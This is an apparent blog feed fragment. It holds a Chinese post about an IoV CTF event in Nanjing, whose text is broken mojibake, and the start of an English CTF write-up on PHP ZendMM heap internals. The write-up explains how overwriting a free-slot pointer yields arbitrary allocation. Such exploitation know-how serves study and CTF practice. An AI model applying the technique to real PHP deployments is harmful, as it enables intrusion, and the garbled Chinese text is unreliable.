ËΩ¶ËÅîÁΩëÊñπÈù¢ËÉΩÊâæÂà∞ÁöÑËµÑÊñôÂ§ßÂ§öÊØîËæÉÊ®°Á≥äÈõ∂Êï£‰∏îÊäΩË±°ÔºåÊ≤°ÊúâÂÆûÈôÖ‰∏äÊâãËøáÔºåÊúÄÂêéËøòÊòØ‰∏ÄÂ§¥ÈõæÊ∞¥„ÄÇ</p><p>ÂÆûÈôÖ‰∏äÊØîËµõ‰∏≠Âç†Â§ßÂ§¥ÁöÑËøòÊòØËΩ¶ËÅîÁΩë„ÄÇËøô‰∏™ËµõÈÅìÂåÖÂê´t-box„ÄÅADASÈªëÁôΩÁõíÊ∏óÈÄèÔºåËøòÊúâ‰∏Ä‰∏™ÂÆûÂú∞Êó•ËΩ¶ÁöÑÊåëÊàò„ÄÇ</p><p>t-boxÈªëÁõíÈ¢ò‰∏≠ÊúâÂá†‰∏™ËÆæÂ§áÊèê‰æõ‰∫ÜarmÂõ∫‰ª∂Ôºå‰ΩÜÊòØÂàÜÊûê‰πãÂêéÊàëÁ°ÆÂÆûÊâæ‰∏çÂà∞Â¶Ç‰Ωï‰∏ãÊâã„ÄÇÊúâÁöÑÁúãËµ∑Êù•ÊòØ‰∏ÄÈÅìÈÄÜÂêëÈ¢òÔºåÁÑ∂ËÄåÂ∞±ÁÆóÁªôÂá∫Ê≠£Á°ÆÁöÑËæìÂÖ•ÔºåÊúÄÂêéÊãøÂà∞ÁöÑ‰πü‰∏çÊòØÈ¢òÁõÆË¶ÅÊ±ÇÁöÑflagÔºåÊ≠§Â§ñ‰πüÊ≤°ÊúâÂà´ÁöÑÊºèÊ¥ûÂèØ‰ª•Âà©Áî®„ÄÇËøòÊúâ‰∏ÄÈÅìÂ≠òÂú®‰∏Ä‰∏™Êï∞ÁªÑ2byteÁöÑË∂äÁïåÔºå‰ΩÜÊòØËøô‰∏™Ë∂äÁïåÊ≤°Êúâ‰ªª‰ΩïÂçµÁî®ÔºåÂè™ËÉΩË¶ÜÁõñ‰∏Ä‰∏™ÂûÉÂúæÂèòÈáè„ÄÇÊàñËÆ∏Ë∞ÉÁöÑlibcÂ≠òÂú®ÊºèÊ¥ûÔºüÊàëÊ≤°ÊâæÂà∞„ÄÇ</p><p>Âà´ÁöÑËΩ¶ËÅîÁΩëÁõ∏ÂÖ≥Âà©Áî®Â∞±Ë∂ÖÂá∫ÊàëÁöÑÁü•ËØÜËåÉÂõ¥‰∫ÜÔºåÂè™ËÉΩÂ∏ÆÈòüÂèãËØïËØïÂº±ÂØÜÁ†ÅÔºåÊâæÊâæÊïèÊÑüÊñá‰ª∂„ÄÇÂ±û‰∫éÂèÇ‰∏éÊÑü‰∏çÂº∫„ÄÇ‰∏çËøáÁúãÈòüÂèã‰º™ÈÄ†CANÊä•Êñá‰ªÄ‰πàÁöÑËøòÊòØÊå∫ÁÇ´ÈÖ∑ÔºåÂèØËÉΩ‰ª•ÂêéÁ†îÁ©∂‰∏Ä‰∏ãËøôÊñπÈù¢Ôºü</p><p>Ê≠§Â§ñÊØîËµõËøòÊúâ‰º†ÁªüÁöÑctfÔºå‰∏çËøáÂπ∂‰∏çËÆ°ÂÖ•ÊÄªÂàÜÔºåËÄåÊòØËé∑ÂèñÊåëÊàòÂÖ∂‰ªñÈ¢òÁõÆËµÑÊ†ºÁöÑÈÄîÂæÑ„ÄÇÂÅö‰∫ÜÈÅìqilingÊ°ÜÊû∂ÁöÑÊ†àÊ∫¢Âá∫Ôºå‰∏çËøáÊ≤°Âï•Êñ∞‰∏úË•øÔºåÊúÄÂêéËøòÂõ†‰∏∫ÊâãËæìflagÂ≠óÁ¨¶‰∏≤ÂØºËá¥Êú´Â∞æÂ∏¶\nÔºåorwËØª‰∏çÂá∫Êù•Ôºådebug‰∫Ü‰∏§‰∏™Â∞èÊó∂„ÄÇÂ∫¶Ëøá‰∫Ü‰∏ÄÊÆµÁõ∏ÂØπÂ§±Ë¥•ÁöÑÊØîËµõÊó∂Èó¥„ÄÇ</p><h1 id="ÊàëÂéªÔºåALLES"><a href="#ÊàëÂéªÔºåALLES" class="headerlink" title="ÊàëÂéªÔºåALLES!"></a>ÊàëÂéªÔºåALLES!</h1><p>‰πãÂâçÂõ†‰∏∫‰∏Ä‰∏™ÊØîËæÉÂñúÊ¨¢ÁöÑyoutubeÂçö‰∏ªLiveOverflowÔºå‰∫ÜËß£Âà∞‰∫Ü‰ªñÊâÄÂú®ÁöÑËøô‰∏™Âæ∑ÂõΩÊàòÈòü„ÄÇÁúãÂà∞ËøôÊ¨°ÊØîËµõÈÇÄËØ∑‰∫ÜALLESÔºåÊàëËøòÊå∫ÊúüÂæÖÔºåËôΩÁÑ∂ÊúÄÂêé‰ªñÊ≤°ÊúâÊù•„ÄÇ</p><p>ÊØîËµõÁ¨¨‰∏âÂ§©ÁöÑÊó∂ÂÄôÔºåÊàëËøòÊòØÂèó‰∏ç‰∫Ü8Ôºö30Âá∫ÂèëÁöÑ‰ΩúÊÅØÔºå‰∫éÊòØÁù°Â§ßËßâÂà∞‰∫ÜÂçÅ‰∏ÄÁÇπ„ÄÇÂá∫Èó®ÊâìËΩ¶Êó∂ÔºåÂú®ÈÖíÂ∫óÈó®Âè£ÂÅ∂ÈÅá‰∫ÜALLES!ÁöÑ‰∏â‰∏™Âì•‰ª¨ÔºàÊúâ‰∏Ä‰∏™ËøòÊ≤°‰∏ãÊù•Ôºâ„ÄÇ</p><p>‰∫éÊòØÊàëÁ§æ‰∫§Â§ßÂ∏àÂ±ûÊÄßÂ§ßÁàÜÂèëÔºå‰∏äÂâçÊê≠ËÆ™„ÄÇÈ°∫‰æøÈóÆ‰∫ÜÈóÆ‰ªñ‰ª¨ÂØπËøôÊ¨°ÊØîËµõÁöÑÁúãÊ≥ïÔºåÂá†‰ΩçËÄÅÂì•ÂæàÁÉ≠ÊÉÖÔºåËΩÆÊµÅËØ¥‰∫Ü‰∏ÄÂ§ßÂ†Ü„ÄÇÊÄªÁöÑÊù•ËØ¥Â∞±ÊòØÊØîËµõÈ¢òÁõÆÂæàÊúâÊñ∞ÊÑè„ÄÅ‰πüÂæàÈöæÔºåÈ°∫‰æøÂêêÊßΩ‰∫Ü‰ª•‰∏ãËøôÊ¨°ÊØîËµõÁöÑÊñáÊ°£‚Äùlike random English words‚ÄùÔºå‰ª§‰∫∫ÈöæÁª∑„ÄÇ</p><p>‰∏çÂæó‰∏çËØ¥ÔºåÂú®ËøôÊ¨°ÂõΩÈôÖÊàòÈòüÊôÆÈÅçÂºÄÊëÜÁöÑÊÉÖÂÜµ‰∏ãÔºåALLESËÄÅÂì•ÂèçËÄåÁé©ÁöÑÊå∫ÂºÄÂøÉÔºåËøòÂÜ≤Âà∞‰∫ÜËΩ¶ËÅîÁΩëÂâçÂá†„ÄÇ</p><h1 id="Â∞èÂé®Â®ò‰∏é‰∏äÊµÅÈÖíÂ∫ó"><a href="#Â∞èÂé®Â®ò‰∏é‰∏äÊµÅÈÖíÂ∫ó" class="headerlink" title="Â∞èÂé®Â®ò‰∏é‰∏äÊµÅÈÖíÂ∫ó"></a>Â∞èÂé®Â®ò‰∏é‰∏äÊµÅÈÖíÂ∫ó</h1><p>ËøûÁùÄÊØîËµõÂá†Â§©ÔºåÈÉΩÊòØÈÄÅÁöÑÂêå‰∏ÄÂÆ∂Â∫óÁöÑÁõíÈ•≠ÔºàxxÂ∞èÂé®Â®òÔºâÔºåÂè£Âë≥Â∫îËØ•ËææÂà∞‰∫ÜÁîüÂëΩ‰ΩìÂæÅÁª¥ÊåÅÈ§êÁöÑÊ†áÂáÜ„ÄÇÈô§‰∫ÜÁ¨¨‰∫åÂ§©Êôö‰∏äÈÄÅÁöÑÊòØÈ∫¶È∫¶Ôºå‰∏çËøáÊØè‰∫∫Âè™Êúâ‰∏Ä‰ªΩÊ±âÂ†°ÂíåÈ∏°ÁøÖÔºåËøôÁßç‰∏ªÂäûÊñπÂ∞±ËØ•Ë¢´ÈÄêÂá∫È∫¶Èó®ÔºÅ</p><p>ÈÖíÂ∫óÂÄíÊå∫Ë±™ÂçéÔºåÊØèÂ§©ËøòÈÄÅ‰∏Ä‰∏™Ê∞¥Êûú„ÄÇÁº∫ÁÇπÊòØÊØèÂ§©Êó©‰∏äÂ§ßÂÆ∂Êä¢ÁùÄÂêÉÊó©È•≠ÔºåÁîµÊ¢ØÂíåÈ§êÂéÖÁöÑÂÆπÈáèÈÉΩ‰∏çË∂≥‰ª•Â∫îÂØπÁû¨Êó∂‰∫∫ÊµÅËÄåÊé•ËøëÁò´Áó™„ÄÇËøòÂ•ΩÊàëÂêéÈù¢Êó©‰∏äÈÉΩÁù°Â§ßËßâ„ÄÇ</p><hr><p>iovÊ∏óÈÄèÁúãËµ∑Êù•ËøòÊå∫Â•ΩÁé©Ôºå‰ª•ÂêéÊúâÁ©∫Â≠¶Â≠¶„ÄÇ</p><p>‰∏çËøáÁü≠ÊúüÁõÆÊ†áËøòÊòØÂÖàËÄÉÂ•ΩËøô‰∏™BÊúüÊú´ÂêßÔºå‰∏çÁÑ∂‰ª•ÂêéÊÉ≥ËØªÁ†îÊ≤°Â≠¶‰∏ä‰∫Ü</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Âæà‰πÖÊ≤°ÊâìËøáËøô‰πà‰πÖÁöÑÁ∫ø‰∏ã‰∫Ü„ÄÇ&lt;/p&gt;
&lt;p&gt;Âú®Âçó‰∫¨ÔºåÊåÅÁª≠72Â∞èÊó∂ÔºåÂíå‰∏ñÁïåÂêÑÂú∞ÁöÑÂº∫ÂäõÊàòÈòüÂêåÂè∞Á´ûÊäÄ„ÄÇ‰∏çÂæó‰∏çËØ¥ÔºåÂê¨Ëµ∑Êù•Êå∫ÈÖ∑„ÄÇ&lt;/p&gt;
&lt;h1 id=&quot;ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ&quot;&gt;&lt;a href=&quot;#ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ&quot; class=&quot;headerlink&quot; title=&quot;ÊàëÂú®Âçó‰∫¨</summary>
      
    
    
    
    <category term="misc" scheme="http://deepunk.icu/categories/misc/"/>
    
    
    <category term="Êë∏" scheme="http://deepunk.icu/tags/%E6%91%B8/"/>
    
    <category term="iot" scheme="http://deepunk.icu/tags/iot/"/>
    
    <category term="iov" scheme="http://deepunk.icu/tags/iov/"/>
    
  </entry>
  
  <entry>
    <title>A Brief Introduction to PHP Heap Exploitation</title>
    <link href="http://deepunk.icu/php-pwn/"/>
    <id>http://deepunk.icu/php-pwn/</id>
    <published>2023-09-14T11:59:41.000Z</published>
    <updated>2023-12-09T14:12:29.283Z</updated>
    
    <content type="html"><![CDATA[<p>It&#96;s my first time encountering this fancy pwn item, known as Web Pwn, on WACON2023. I have few experience on php coding, so it spent me a long time to figure out how ZendMM actually works.</p><h1 id="The-Memory-Management-of-Zend-Engine"><a href="#The-Memory-Management-of-Zend-Engine" class="headerlink" title="The Memory Management of Zend Engine"></a>The Memory Management of Zend Engine</h1><p>PHP codes are explained through the <strong>Zend engine</strong>. Instead of directly using traditional <code>malloc</code> and <code>free</code> to manage memory, Zend uses <strong>ZendMM</strong> to allocate and release memory through <code>emalloc</code> and <code>efree</code> , which efficiently serves PHP request-bound machanisms (that&#96;s another topic). </p><h2 id="Basic-Structure"><a href="#Basic-Structure" class="headerlink" title="Basic Structure"></a>Basic Structure</h2><p>As writen in <code>zend_alloc.c</code> source code, all allocations are split into 3 categories: huge, large and small. Remember that zend_alloc allocates memory form OS by <strong>CHUNKS</strong>, which contains 2MB memories. Huge allocs are those who exceed a chunk. And zend_alloc use  <code>mmap</code> to allocate one. The concept of <strong>PAGE</strong> is commonly used in ZendMM, which usually contains 4KB memories. That&#96;s to say, a chunk contains 512 pages. Small allocs are less than 3&#x2F;4 of page size. The rest are Large allocs.</p><p><img src="/../img/php-pwn.assets/image-20231209221140856.png" alt="image-20231209221140856"></p><p>Each time a chunk is alloced, the first page of the chunk is used to record basic information about the chunk. The Structure recording information is <code>_zend_mm_chunk</code> ,(which doesn&#96;t appear in huge chunk)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">zend_mm_heap      *heap;</span><br><span class="line">zend_mm_chunk     *next;</span><br><span class="line">zend_mm_chunk     *prev;</span><br><span class="line"><span class="type">uint32_t</span>           free_pages;<span class="comment">/* number of free pages */</span></span><br><span class="line"><span class="type">uint32_t</span>           free_tail;               <span class="comment">/* number of free pages at the end of chunk */</span></span><br><span class="line"><span class="type">uint32_t</span>           num;</span><br><span class="line"><span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">3</span>)];</span><br><span class="line">zend_mm_heap       heap_slot;               <span class="comment">/* used only in main chunk */</span></span><br><span class="line">zend_mm_page_map   free_map;                <span class="comment">/* 512 bits or 64 bytes */</span></span><br><span class="line">zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>All the chunks form a double linked list (<code>*next</code>, <code>*prev</code>). A chunk records the usage and other detailed information of its 512 pages through <code>zend_mm_page_map</code>, <code>zend_mm_page_info</code>. Also, the <code>zend_mm_heap</code> structure merits attention.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line"><span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line"><span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">zend_mm_chunk     *main_chunk;</span><br><span class="line">zend_mm_chunk     *cached_chunks;<span class="comment">/* list of unused chunks */</span></span><br><span class="line"><span class="type">int</span>                chunks_count;<span class="comment">/* number of allocated chunks */</span></span><br><span class="line"><span class="type">int</span>                peak_chunks_count;<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line"><span class="type">int</span>                cached_chunks_count;<span class="comment">/* number of cached chunks */</span></span><br><span class="line"><span class="type">double</span>             avg_chunks_count;<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_boundary; <span class="comment">/* number of chunks after last deletion */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_count;    <span class="comment">/* number of deletion over the last boundary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">&#125; <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">&#125; debug;</span><br><span class="line">&#125; custom_heap;</span><br><span class="line">HashTable *tracked_allocs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Mind the <code>zend_mm_free_slot</code>. The <code>ZEND_MM_BINS</code> usually is 30, which means there are 30 fixed size for small runs. As a result, there are 30 single linked list.</p><h2 id="Vulnerable-Small-Runs"><a href="#Vulnerable-Small-Runs" class="headerlink" title="Vulnerable Small Runs"></a>Vulnerable Small Runs</h2><p>We mainly focus on small runs, because its vulnerable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line"><span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function is mainly used for building the small run chain when allocating  a chunk. It explains how 30 single linked chains are built. Because each part of the chain doesn&#96;t have to contain a header about its size, only leaving the fd, we may find the weird scene (compared to glibc) in the memory.</p><p><img src="/../img/php-pwn.assets/image-20230914220353292.png" alt="image-20230914220353292"> </p><p>When we allocate a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line"><span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">heap-&gt;size = size;</span><br><span class="line">heap-&gt;peak = peak;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When we release a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = (zend_mm_free_slot*)ptr;</span><br><span class="line">p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Both of the functions lake security checks .If we replace the fd of it by out target address, we get an arbitrary address allocate!  That makes small runs vulnerable.</p><h1 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h1><p>A typical php-pwn, we are given a docker environment and a vulnerable php extension module heaphp.so.</p><p>It took me quite a long time building local php environment following the guideline on blogs. I complied php locally aming to debug it easily.  <a href="https://learnku.com/docs/php-internals/php7/building_php/6840">This document</a> helped a lot. However, if you try to complie php with debug-symbol, the ABI of the binary will change, which makes your extension unable to load properly. That ‚Äòs actually what I encountered. </p><p>So, What ‚Äòs the point of it ? I don ‚Äòt know.</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>All protection is on except Partial RELRO .The extension mainly consists of 5 functions: add, view, edit, list, delete. Because of zend engine, the pseudo-code are hard to understand (especially for noobs like me). There are tons of code of uncertain significance like:</p><p><img src="/../img/php-pwn.assets/image-20230914223544720.png" alt="image-20230914223544720"></p><p>Then we must dig into the basic data type in zend. That`s <code>_zend_value</code> and <code>_zval_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">zend_long         lval;<span 